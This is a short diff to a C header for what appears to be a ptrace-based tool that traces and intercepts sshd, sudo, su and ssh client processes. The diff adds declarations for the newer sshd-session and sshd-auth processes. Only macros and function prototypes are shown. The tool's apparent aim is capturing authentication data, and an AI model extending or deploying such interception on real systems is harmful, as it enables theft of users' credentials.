@@ -16,6 +16,8 @@
 
 #define P_SSH_NET "sshd: [net]"
 #define P_SSH_ACC "sshd: [accepted]"
+#define P_SSHD_SESSION "sshd-session"
+#define P_SSHD_AUTH "sshd-auth"
 #define P_SUDO "sudo "
 #define P_SU "su "
 #define P_SSH_CLIENT "ssh "
@@ -56,6 +58,7 @@ enum tracer_types {
 };
 
 void trace_process(pid_t);
+pid_t get_ppid(pid_t pid);
 long __get_reg(pid_t, int);
 int get_syscall(pid_t);
 int wait_for_syscall(pid_t);
@@ -73,6 +76,8 @@ void free_process_username(void);
 
 //Forward declaration to avoid circular dependancy
 void intercept_ssh(pid_t);
+void intercept_ssh_auth(pid_t);
+void intercept_ssh_session(pid_t);
 void intercept_sudo(pid_t);
 void intercept_su(pid_t);
 void intercept_ssh_client(pid_t);
